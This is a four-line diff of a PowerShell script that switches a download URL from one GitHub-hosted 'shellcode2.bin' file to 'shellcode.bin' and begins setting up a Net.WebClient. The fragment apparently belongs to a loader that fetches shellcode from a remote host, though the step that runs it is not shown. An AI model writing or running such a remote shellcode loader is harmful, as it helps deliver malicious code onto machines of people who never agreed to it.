@@ -1,4 +1,4 @@
-$url = "https://github.com/MJ06-BP/bp/raw/refs/heads/main/shellcode2.bin"
+$url = "https://github.com/MJ06-BP/bp/raw/refs/heads/main/shellcode.bin"
 
 try {
     $wc = New-Object Net.WebClient
